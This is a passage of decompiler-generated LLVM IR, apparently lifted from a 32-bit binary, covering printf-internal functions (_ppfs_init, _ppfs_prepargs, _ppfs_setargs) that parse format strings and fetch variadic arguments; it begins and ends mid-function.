  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0, 62, 63, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804ec42, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804ec3b, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804ec03, { 1, 0 }
  uselistorder label %dec_label_pc_804ebba, { 1, 0 }
  uselistorder label %dec_label_pc_804eba3, { 1, 0 }
  uselistorder label %dec_label_pc_804eb4e, { 1, 0 }
  uselistorder label %dec_label_pc_804eb20, { 1, 0 }
  uselistorder label %dec_label_pc_804eb05, { 1, 0 }
  uselistorder label %dec_label_pc_804eaef, { 1, 0 }
  uselistorder label %dec_label_pc_804eadb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ead6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ea68, { 1, 0 }
  uselistorder label %dec_label_pc_804ea4e, { 1, 0 }
  uselistorder label %dec_label_pc_804e96c, { 1, 0 }
  uselistorder label %dec_label_pc_804e911, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804e8bf, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e86f, { 1, 0 }
  uselistorder label %dec_label_pc_804e856, { 1, 0 }
  uselistorder label %dec_label_pc_804e842, { 1, 0 }
  uselistorder label %dec_label_pc_804e83d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e81e, { 1, 0 }
  uselistorder label %dec_label_pc_804e7a9, { 1, 0 }
  uselistorder label %dec_label_pc_804e7a1, { 1, 0 }
  uselistorder label %dec_label_pc_804e74d, { 1, 0 }
  uselistorder label %dec_label_pc_804e742, { 1, 0 }
  uselistorder label %dec_label_pc_804e718.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ec50 = load i32, i32* @esi, align 4
  %v0_804ec51 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec51, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804ec65 = bitcast i32* %arg1 to i8*
  %v4_804ec65 = call i32 @__GI_memset(i8* %v3_804ec65, i32 0, i32 188)
  %v0_804ec6a = load i32, i32* @ebx, align 4
  %v1_804ec6a = add i32 %v0_804ec6a, 40
  store i32 %v1_804ec6a, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804ec72 = add i32 %v0_804ec6a, 24
  %v2_804ec72 = inttoptr i32 %v1_804ec72 to i32*
  %v3_804ec72 = load i32, i32* %v2_804ec72, align 4
  %v4_804ec72 = add i32 %v3_804ec72, -1
  store i32 %v4_804ec72, i32* %v2_804ec72, align 4
  %v0_804ec78 = load i32, i32* @esi, align 4
  %v1_804ec78 = load i32, i32* @ebx, align 4
  %v2_804ec78 = inttoptr i32 %v1_804ec78 to i32*
  store i32 %v0_804ec78, i32* %v2_804ec78, align 4
  %v0_804ec7a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec7a

dec_label_pc_804ec7a:                             ; preds = %dec_label_pc_804ec7a, %entry
  %v0_804ec7a = phi i32 [ %v1_804ec80, %dec_label_pc_804ec7a ], [ %v0_804ec7a.pre, %entry ]
  %v1_804ec7a = inttoptr i32 %v0_804ec7a to i32*
  store i32 8, i32* %v1_804ec7a, align 4
  %v0_804ec80 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec80 = add i32 %v0_804ec80, 4
  store i32 %v1_804ec80, i32* %eax.global-to-local, align 4
  %v0_804ec83 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec83 = add i32 %v0_804ec83, -1
  %v8_804ec83 = icmp eq i32 %v1_804ec83, 0
  store i32 %v1_804ec83, i32* %edx.global-to-local, align 4
  %v1_804ec84 = icmp eq i1 %v8_804ec83, false
  br i1 %v1_804ec84, label %dec_label_pc_804ec7a, label %dec_label_pc_804ec86

dec_label_pc_804ec86:                             ; preds = %dec_label_pc_804ec7a
  %v0_804ec86 = load i32, i32* @esi, align 4
  store i32 %v0_804ec86, i32* %eax.global-to-local, align 4
  %v1_804ecb120 = inttoptr i32 %v0_804ec86 to i8*
  %v2_804ecb121 = load i8, i8* %v1_804ecb120, align 1
  %v3_804ecb122 = zext i8 %v2_804ecb121 to i32
  %v5_804ecb123 = and i32 %v1_804ec83, -256
  %v6_804ecb124 = or i32 %v3_804ecb122, %v5_804ecb123
  store i32 %v6_804ecb124, i32* %edx.global-to-local, align 4
  %v4_804ecb325 = icmp eq i8 %v2_804ecb121, 0
  %v1_804ecb527 = icmp eq i1 %v4_804ecb325, false
  br i1 %v1_804ecb527, label %dec_label_pc_804ec8f, label %dec_label_pc_804ecb7

dec_label_pc_804ec8f:                             ; preds = %dec_label_pc_804ec86, %dec_label_pc_804ecb1.backedge
  %v6_804ecb130 = phi i32 [ %v6_804ecb1, %dec_label_pc_804ecb1.backedge ], [ %v6_804ecb124, %dec_label_pc_804ec86 ]
  %v2_804ecb129 = phi i8 [ %v2_804ecb1, %dec_label_pc_804ecb1.backedge ], [ %v2_804ecb121, %dec_label_pc_804ec86 ]
  %v0_804ec9428 = phi i32 [ %v0_804ec94.be, %dec_label_pc_804ecb1.backedge ], [ %v0_804ec86, %dec_label_pc_804ec86 ]
  %v10_804ec8f = icmp eq i8 %v2_804ecb129, 37
  %v1_804ec92 = icmp eq i1 %v10_804ec8f, false
  br i1 %v1_804ec92, label %dec_label_pc_804ecb0, label %dec_label_pc_804ec94

dec_label_pc_804ec94:                             ; preds = %dec_label_pc_804ec8f
  %v1_804ec94 = add i32 %v0_804ec9428, 1
  store i32 %v1_804ec94, i32* %eax.global-to-local, align 4
  %v1_804ec95 = inttoptr i32 %v1_804ec94 to i8*
  %v2_804ec95 = load i8, i8* %v1_804ec95, align 1
  %v11_804ec95 = icmp eq i8 %v2_804ec95, 37
  br i1 %v11_804ec95, label %dec_label_pc_804ecb0, label %dec_label_pc_804ec9a

dec_label_pc_804ec9a:                             ; preds = %dec_label_pc_804ec94
  %v1_804ec9d = load i32, i32* @ebx, align 4
  %v2_804ec9d = inttoptr i32 %v1_804ec9d to i32*
  store i32 %v1_804ec94, i32* %v2_804ec9d, align 4
  %v0_804ec9f = load i32, i32* @ebx, align 4
  %v1_804eca0 = inttoptr i32 %v0_804ec9f to i32*
  %v2_804eca0 = call i32 @_ppfs_parsespec(i32* %v1_804eca0)
  store i32 %v2_804eca0, i32* %eax.global-to-local, align 4
  %v2_804eca8 = icmp slt i32 %v2_804eca0, 0
  br i1 %v2_804eca8, label %dec_label_pc_804ecbb, label %dec_label_pc_804ecac

dec_label_pc_804ecac:                             ; preds = %dec_label_pc_804ec9a
  %v0_804ecac = load i32, i32* @ebx, align 4
  %v1_804ecac = inttoptr i32 %v0_804ecac to i32*
  %v2_804ecac = load i32, i32* %v1_804ecac, align 4
  %v4_804ecb1.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ecb1.backedge

dec_label_pc_804ecb0:                             ; preds = %dec_label_pc_804ec94, %dec_label_pc_804ec8f
  %v0_804ecb0 = phi i32 [ %v1_804ec94, %dec_label_pc_804ec94 ], [ %v0_804ec9428, %dec_label_pc_804ec8f ]
  %v1_804ecb0 = add i32 %v0_804ecb0, 1
  br label %dec_label_pc_804ecb1.backedge

dec_label_pc_804ecb1.backedge:                    ; preds = %dec_label_pc_804ecb0, %dec_label_pc_804ecac
  %v4_804ecb1.be = phi i32 [ %v4_804ecb1.pre.pre, %dec_label_pc_804ecac ], [ %v6_804ecb130, %dec_label_pc_804ecb0 ]
  %v0_804ec94.be = phi i32 [ %v2_804ecac, %dec_label_pc_804ecac ], [ %v1_804ecb0, %dec_label_pc_804ecb0 ]
  store i32 %v0_804ec94.be, i32* %eax.global-to-local, align 4
  %v1_804ecb1 = inttoptr i32 %v0_804ec94.be to i8*
  %v2_804ecb1 = load i8, i8* %v1_804ecb1, align 1
  %v3_804ecb1 = zext i8 %v2_804ecb1 to i32
  %v5_804ecb1 = and i32 %v4_804ecb1.be, -256
  %v6_804ecb1 = or i32 %v3_804ecb1, %v5_804ecb1
  store i32 %v6_804ecb1, i32* %edx.global-to-local, align 4
  %v4_804ecb3 = icmp eq i8 %v2_804ecb1, 0
  %v1_804ecb5 = icmp eq i1 %v4_804ecb3, false
  br i1 %v1_804ecb5, label %dec_label_pc_804ec8f, label %dec_label_pc_804ecb1.dec_label_pc_804ecb7_crit_edge

dec_label_pc_804ecb1.dec_label_pc_804ecb7_crit_edge: ; preds = %dec_label_pc_804ecb1.backedge
  %v0_804ecb7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ecb7

dec_label_pc_804ecb7:                             ; preds = %dec_label_pc_804ecb1.dec_label_pc_804ecb7_crit_edge, %dec_label_pc_804ec86
  %v0_804ecb7 = phi i32 [ %v0_804ecb7.pre, %dec_label_pc_804ecb1.dec_label_pc_804ecb7_crit_edge ], [ %v0_804ec86, %dec_label_pc_804ec86 ]
  %v1_804ecb7 = load i32, i32* @ebx, align 4
  %v2_804ecb7 = inttoptr i32 %v1_804ecb7 to i32*
  store i32 %v0_804ecb7, i32* %v2_804ecb7, align 4
  br label %dec_label_pc_804ecbb

dec_label_pc_804ecbb:                             ; preds = %dec_label_pc_804ec9a, %dec_label_pc_804ecb7
  %storemerge = phi i32 [ 0, %dec_label_pc_804ecb7 ], [ -1, %dec_label_pc_804ec9a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804ecbb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ecbb, i32* @edx, align 4
  %v2_804ecbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ecbc, i32* @ebx, align 4
  store i32 %v0_804ec50, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804ecb1, { 1, 0 }
  uselistorder i8 %v2_804ecb1, { 1, 2, 0 }
  uselistorder i32 %v0_804ec94.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ec9428, { 1, 0 }
  uselistorder i32 %v0_804ec86, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ec83, { 0, 2, 1 }
  uselistorder i32 %v1_804ec80, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804ecbb, { 1, 0 }
  uselistorder label %dec_label_pc_804ec8f, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804ecc0 = load i32, i32* @esi, align 4
  %v0_804ecc1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804eccd = add i32 %arg1, 24
  %v2_804eccd = inttoptr i32 %v1_804eccd to i32*
  %v3_804eccd = load i32, i32* %v2_804eccd, align 4
  %v2_804ecd0 = add i32 %arg1, 76
  %v3_804ecd0 = inttoptr i32 %v2_804ecd0 to i32*
  store i32 %arg2, i32* %v3_804ecd0, align 4
  %tmp8 = icmp slt i32 %v3_804eccd, 1
  br i1 %tmp8, label %dec_label_pc_804ecfe, label %dec_label_pc_804ecd7

dec_label_pc_804ecd7:                             ; preds = %entry
  %v1_804ecda = load i32, i32* @ebx, align 4
  %v2_804ecda = add i32 %v1_804ecda, 28
  %v3_804ecda = inttoptr i32 %v2_804ecda to i32*
  store i32 %v3_804eccd, i32* %v3_804ecda, align 4
  %v0_804ecdd = load i32, i32* @ebx, align 4
  %v1_804ecdd = add i32 %v0_804ecdd, 24
  %v2_804ecdd = inttoptr i32 %v1_804ecdd to i32*
  store i32 0, i32* %v2_804ecdd, align 4
  %v0_804ece4 = load i32, i32* @ebx, align 4
  %v1_804ece4 = add i32 %v0_804ece4, 4
  %v2_804ece4 = inttoptr i32 %v1_804ece4 to i32*
  store i32 0, i32* %v2_804ece4, align 4
  %v0_804eceb = load i32, i32* @ebx, align 4
  %v1_804eceb = add i32 %v0_804eceb, 8
  %v2_804eceb = inttoptr i32 %v1_804eceb to i32*
  store i32 0, i32* %v2_804eceb, align 4
  %v0_804ecf2 = load i32, i32* @ebx, align 4
  %v1_804ecf3 = call i32 @_ppfs_setargs(i32 %v0_804ecf2)
  %v1_804ecfb = load i32, i32* @ebx, align 4
  %v2_804ecfb = add i32 %v1_804ecfb, 24
  %v3_804ecfb = inttoptr i32 %v2_804ecfb to i32*
  store i32 %v3_804eccd, i32* %v3_804ecfb, align 4
  br label %dec_label_pc_804ecfe

dec_label_pc_804ecfe:                             ; preds = %entry, %dec_label_pc_804ecd7
  %v2_804ecfe = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804ecc1, i32* @ebx, align 4
  store i32 %v0_804ecc0, i32* @esi, align 4
  ret i32 %v2_804ecfe

; uselistorder directives
  uselistorder i32 %v3_804eccd, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ecfe, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ed05 = load i32, i32* @ebx, align 4
  store i32 %v0_804ed05, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804ed0a = add i32 %arg1, 24
  %v2_804ed0a = inttoptr i32 %v1_804ed0a to i32*
  %v3_804ed0a = load i32, i32* %v2_804ed0a, align 4
  %v4_804ed0a = icmp eq i32 %v3_804ed0a, 0
  %v1_804ed0e = add i32 %arg1, 80
  store i32 %v1_804ed0e, i32* %ebx.global-to-local, align 4
  %v1_804ed11 = icmp eq i1 %v4_804ed0a, false
  %v1_804edc9 = add i32 %arg1, 8
  %v2_804edc9 = inttoptr i32 %v1_804edc9 to i32*
  %v3_804edc9 = load i32, i32* %v2_804edc9, align 4
  %v8_804edc9 = icmp eq i32 %v3_804edc9, -2147483648
  %v1_804edd0 = icmp eq i1 %v8_804edc9, false
  br i1 %v1_804ed11, label %dec_label_pc_804edc9, label %dec_label_pc_804ed17

dec_label_pc_804ed17:                             ; preds = %entry
  br i1 %v1_804edd0, label %dec_label_pc_804ed31, label %dec_label_pc_804ed20

dec_label_pc_804ed20:                             ; preds = %dec_label_pc_804ed17
  %v1_804ed20 = add i32 %arg1, 76
  %v2_804ed20 = inttoptr i32 %v1_804ed20 to i32*
  %v3_804ed20 = load i32, i32* %v2_804ed20, align 4
  store i32 %v3_804ed20, i32* %eax.global-to-local, align 4
  %v1_804ed23 = add i32 %v3_804ed20, 4
  store i32 %v1_804ed23, i32* %edx.global-to-local, align 4
  store i32 %v1_804ed23, i32* %v2_804ed20, align 4
  %v0_804ed29 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed29 = inttoptr i32 %v0_804ed29 to i32*
  %v2_804ed29 = load i32, i32* %v1_804ed29, align 4
  store i32 %v2_804ed29, i32* %eax.global-to-local, align 4
  %v1_804ed2b = load i32, i32* @ecx, align 4
  %v2_804ed2b = add i32 %v1_804ed2b, 80
  %v3_804ed2b = inttoptr i32 %v2_804ed2b to i32*
  store i32 %v2_804ed29, i32* %v3_804ed2b, align 4
  %v0_804ed2e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed2e = load i32, i32* @ecx, align 4
  %v2_804ed2e = add i32 %v1_804ed2e, 8
  %v3_804ed2e = inttoptr i32 %v2_804ed2e to i32*
  store i32 %v0_804ed2e, i32* %v3_804ed2e, align 4
  %v0_804ed31.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ed31

dec_label_pc_804ed31:                             ; preds = %dec_label_pc_804ed17, %dec_label_pc_804ed20
  %v1_804ed40 = phi i32 [ %arg1, %dec_label_pc_804ed17 ], [ %v0_804ed31.pre, %dec_label_pc_804ed20 ]
  %v1_804ed31 = add i32 %v1_804ed40, 4
  %v2_804ed31 = inttoptr i32 %v1_804ed31 to i32*
  %v3_804ed31 = load i32, i32* %v2_804ed31, align 4
  %v8_804ed31 = icmp eq i32 %v3_804ed31, -2147483648
  %v1_804ed38 = icmp eq i1 %v8_804ed31, false
  br i1 %v1_804ed38, label %dec_label_pc_804ed4b, label %dec_label_pc_804ed3a

dec_label_pc_804ed3a:                             ; preds = %dec_label_pc_804ed31
  %v1_804ed3a = add i32 %v1_804ed40, 76
  %v2_804ed3a = inttoptr i32 %v1_804ed3a to i32*
  %v3_804ed3a = load i32, i32* %v2_804ed3a, align 4
  store i32 %v3_804ed3a, i32* %eax.global-to-local, align 4
  %v1_804ed3d = add i32 %v3_804ed3a, 4
  store i32 %v1_804ed3d, i32* %edx.global-to-local, align 4
  store i32 %v1_804ed3d, i32* %v2_804ed3a, align 4
  %v0_804ed43 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed43 = inttoptr i32 %v0_804ed43 to i32*
  %v2_804ed43 = load i32, i32* %v1_804ed43, align 4
  store i32 %v2_804ed43, i32* %eax.global-to-local, align 4
  %v1_804ed45 = load i32, i32* @ecx, align 4
  %v2_804ed45 = add i32 %v1_804ed45, 80
  %v3_804ed45 = inttoptr i32 %v2_804ed45 to i32*
  store i32 %v2_804ed43, i32* %v3_804ed45, align 4
  %v0_804ed48 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed48 = load i32, i32* @ecx, align 4
  %v2_804ed48 = add i32 %v1_804ed48, 4
  %v3_804ed48 = inttoptr i32 %v2_804ed48 to i32*
  store i32 %v0_804ed48, i32* %v3_804ed48, align 4
  %v1_804edc215.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ed4b

dec_label_pc_804ed4b:                             ; preds = %dec_label_pc_804ed31, %dec_label_pc_804ed3a
  %v1_804edc215 = phi i32 [ %v1_804ed40, %dec_label_pc_804ed31 ], [ %v1_804edc215.pre, %dec_label_pc_804ed3a ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804edc216 = add i32 %v1_804edc215, 28
  %v3_804edc217 = inttoptr i32 %v2_804edc216 to i32*
  %v4_804edc218 = load i32, i32* %v3_804edc217, align 4
  %v5_804edc520 = icmp sgt i32 %v4_804edc218, 0
  br i1 %v5_804edc520, label %dec_label_pc_804ed4f, label %dec_label_pc_804edf7.loopexit

dec_label_pc_804ed4f:                             ; preds = %dec_label_pc_804ed4b, %dec_label_pc_804edc1
  %v1_804edc222 = phi i32 [ %v1_804edc2, %dec_label_pc_804edc1 ], [ %v1_804edc215, %dec_label_pc_804ed4b ]
  %v1_804ed4f21 = phi i32 [ %v1_804edc1, %dec_label_pc_804edc1 ], [ 0, %dec_label_pc_804ed4b ]
  %v2_804ed4f = mul i32 %v1_804ed4f21, 4
  %v3_804ed4f = add i32 %v2_804ed4f, 40
  %v4_804ed4f = add i32 %v3_804ed4f, %v1_804edc222
  %v5_804ed4f = inttoptr i32 %v4_804ed4f to i32*
  %v6_804ed4f = load i32, i32* %v5_804ed4f, align 4
  store i32 %v6_804ed4f, i32* %eax.global-to-local, align 4
  %v1_804ed53 = add i32 %v6_804ed4f, -8
  %v9_804ed53 = icmp eq i32 %v1_804ed53, 0
  br i1 %v9_804ed53, label %dec_label_pc_804edc1, label %dec_label_pc_804ed58

dec_label_pc_804ed58:                             ; preds = %dec_label_pc_804ed4f
  %v10_804ed53 = icmp slt i32 %v1_804ed53, 0
  %v6_804ed53 = sub i32 7, %v6_804ed4f
  %v7_804ed53 = and i32 %v6_804ed53, %v6_804ed4f
  %v8_804ed53 = icmp slt i32 %v7_804ed53, 0
  %v1_804ed58 = add i32 %v1_804edc222, 76
  %v2_804ed58 = inttoptr i32 %v1_804ed58 to i32*
  %v3_804ed58 = load i32, i32* %v2_804ed58, align 4
  store i32 %v3_804ed58, i32* %edx.global-to-local, align 4
  %v3_804ed5b = icmp eq i1 %v10_804ed53, %v8_804ed53
  br i1 %v3_804ed5b, label %dec_label_pc_804ed6b, label %dec_label_pc_804ed5d

dec_label_pc_804ed5d:                             ; preds = %dec_label_pc_804ed58
  %tmp13 = icmp slt i32 %v6_804ed4f, 3
  %v9_804ed64 = icmp eq i32 %v6_804ed4f, 7
  %v1_804ed67 = icmp eq i1 %v9_804ed64, false
  %or.cond = or i1 %tmp13, %v1_804ed67
  br i1 %or.cond, label %dec_label_pc_804edb4, label %dec_label_pc_804ed96

dec_label_pc_804ed6b:                             ; preds = %dec_label_pc_804ed58
  %tmp14 = icmp sgt i32 %v6_804ed4f, 1024
  br i1 %tmp14, label %dec_label_pc_804ed74, label %dec_label_pc_804edb4

dec_label_pc_804ed74:                             ; preds = %dec_label_pc_804ed6b
  %v6_804ed74 = icmp eq i32 %v6_804ed4f, 2048
  br i1 %v6_804ed74, label %dec_label_pc_804ed84, label %dec_label_pc_804ed7b

dec_label_pc_804ed7b:                             ; preds = %dec_label_pc_804ed74
  %v9_804ed7b = icmp eq i32 %v6_804ed4f, 2055
  %v1_804ed80 = icmp eq i1 %v9_804ed7b, false
  br i1 %v1_804ed80, label %dec_label_pc_804edb4, label %dec_label_pc_804eda5

dec_label_pc_804ed84:                             ; preds = %dec_label_pc_804ed74
  %v1_804ed84 = add i32 %v3_804ed58, 8
  store i32 %v1_804ed84, i32* %eax.global-to-local, align 4
  store i32 %v1_804ed84, i32* %v2_804ed58, align 4
  %v0_804ed8a = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed8a = inttoptr i32 %v0_804ed8a to i32*
  %v2_804ed8a = load i32, i32* %v1_804ed8a, align 4
  store i32 %v2_804ed8a, i32* %eax.global-to-local, align 4
  %v1_804ed8c = add i32 %v0_804ed8a, 4
  %v2_804ed8c = inttoptr i32 %v1_804ed8c to i32*
  %v3_804ed8c = load i32, i32* %v2_804ed8c, align 4
  store i32 %v3_804ed8c, i32* %edx.global-to-local, align 4
  %v1_804ed8f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ed8f = inttoptr i32 %v1_804ed8f to i32*
  store i32 %v2_804ed8a, i32* %v2_804ed8f, align 4
  %v0_804ed91 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed91 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ed91 = add i32 %v1_804ed91, 4
  %v3_804ed91 = inttoptr i32 %v2_804ed91 to i32*
  store i32 %v0_804ed91, i32* %v3_804ed91, align 4
  br label %dec_label_pc_804edbe

dec_label_pc_804ed96:                             ; preds = %dec_label_pc_804ed5d
  %v3_804ed96 = load i32, i32* %v2_804ed58, align 4
  store i32 %v3_804ed96, i32* %edx.global-to-local, align 4
  %v1_804ed99 = add i32 %v3_804ed96, 8
  store i32 %v1_804ed99, i32* %eax.global-to-local, align 4
  store i32 %v1_804ed99, i32* %v2_804ed58, align 4
  %v0_804ed9f = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed9f = inttoptr i32 %v0_804ed9f to double*
  %v2_804ed9f = load double, double* %v1_804ed9f, align 4
  %v2_804eda1 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804eda1 = inttoptr i32 %v2_804eda1 to double*
  store double %v2_804ed9f, double* %v4_804eda1, align 4
  br label %dec_label_pc_804edbe

dec_label_pc_804eda5:                             ; preds = %dec_label_pc_804ed7b
  %v3_804eda5 = load i32, i32* %v2_804ed58, align 4
  store i32 %v3_804eda5, i32* %edx.global-to-local, align 4
  %v1_804eda8 = add i32 %v3_804eda5, 12
  store i32 %v1_804eda8, i32* %eax.global-to-local, align 4
  store i32 %v1_804eda8, i32* %v2_804ed58, align 4
  %v0_804edae = load i32, i32* %edx.global-to-local, align 4
  %v1_804edae = inttoptr i32 %v0_804edae to x86_fp80*
  %v2_804edae = load x86_fp80, x86_fp80* %v1_804edae, align 4
  %v2_804edb0 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804edb0 = inttoptr i32 %v2_804edb0 to x86_fp80*
  store x86_fp80 %v2_804edae, x86_fp80* %v3_804edb0, align 4
  br label %dec_label_pc_804edbe

dec_label_pc_804edb4:                             ; preds = %dec_label_pc_804ed5d, %dec_label_pc_804ed6b, %dec_label_pc_804ed7b
  %v1_804edb4 = add i32 %v3_804ed58, 4
  store i32 %v1_804edb4, i32* %eax.global-to-local, align 4
  store i32 %v1_804edb4, i32* %v2_804ed58, align 4
  %v0_804edba = load i32, i32* %edx.global-to-local, align 4
  %v1_804edba = inttoptr i32 %v0_804edba to i32*
  %v2_804edba = load i32, i32* %v1_804edba, align 4
  store i32 %v2_804edba, i32* %eax.global-to-local, align 4
  %v1_804edbc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804edbc = inttoptr i32 %v1_804edbc to i32*
  store i32 %v2_804edba, i32* %v2_804edbc, align 4
  br label %dec_label_pc_804edbe

dec_label_pc_804edbe:                             ; preds = %dec_label_pc_804eda5, %dec_label_pc_804ed96, %dec_label_pc_804ed84, %dec_label_pc_804edb4
  %v0_804edbe = load i32, i32* %ebx.global-to-local, align 4
  %v1_804edbe = add i32 %v0_804edbe, 12
  store i32 %v1_804edbe, i32* %ebx.global-to-local, align 4
  %v0_804edc1.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804edc2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804edc1

dec_label_pc_804edc1:                             ; preds = %dec_label_pc_804ed4f, %dec_label_pc_804edbe
  %v1_804edc2 = phi i32 [ %v1_804edc222, %dec_label_pc_804ed4f ], [ %v1_804edc2.pre, %dec_label_pc_804edbe ]
  %v0_804edc1 = phi i32 [ %v1_804ed4f21, %dec_label_pc_804ed4f ], [ %v0_804edc1.pre, %dec_label_pc_804edbe ]
  %v1_804edc1 = add i32 %v0_804edc1, 1
  store i32 %v1_804edc1, i32* %esi.global-to-local, align 4
  %v2_804edc2 = add i32 %v1_804edc2, 28
  %v3_804edc2 = inttoptr i32 %v2_804edc2 to i32*
  %v4_804edc2 = load i32, i32* %v3_804edc2, align 4
  %v5_804edc5 = icmp slt i32 %v1_804edc1, %v4_804edc2
  br i1 %v5_804edc5, label %dec_label_pc_804ed4f, label %dec_label_pc_804edc2.dec_label_pc_804edf7.loopexit_crit_edge

dec_label_pc_804edc9:                             ; preds = %entry
  br i1 %v1_804edd0, label %dec_label_pc_804ede0, label %dec_label_pc_804edd2

dec_label_pc_804edd2:                             ; preds = %dec_label_pc_804edc9
  %v1_804edd2 = add i32 %arg1, 36
  %v2_804edd2 = inttoptr i32 %v1_804edd2 to i8*
  %v3_804edd2 = load i8, i8* %v2_804edd2, align 1
  %v2_804edd6 = zext i8 %v3_804edd2 to i32
  %v3_804edd6 = mul nuw nsw i32 %v2_804edd6, 12
  store i32 %v3_804edd6, i32* %eax.global-to-local, align 4
  %v2_804edd9 = add i32 %arg1, 68
  %v3_804edd9 = add i32 %v2_804edd9, %v3_804edd6
  %v4_804edd9 = inttoptr i32 %v3_804edd9 to i32*
  %v5_804edd9 = load i32, i32* %v4_804edd9, align 4
  store i32 %v5_804edd9, i32* %eax.global-to-local, align 4
  store i32 %v5_804edd9, i32* %v2_804edc9, align 4
  %v0_804ede0.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ede0

dec_label_pc_804ede0:                             ; preds = %dec_label_pc_804edc9, %dec_label_pc_804edd2
  %v1_804edf4 = phi i32 [ %arg1, %dec_label_pc_804edc9 ], [ %v0_804ede0.pre, %dec_label_pc_804edd2 ]
  %v1_804ede0 = add i32 %v1_804edf4, 4
  %v2_804ede0 = inttoptr i32 %v1_804ede0 to i32*
  %v3_804ede0 = load i32, i32* %v2_804ede0, align 4
  %v8_804ede0 = icmp eq i32 %v3_804ede0, -2147483648
  %v1_804ede7 = icmp eq i1 %v8_804ede0, false
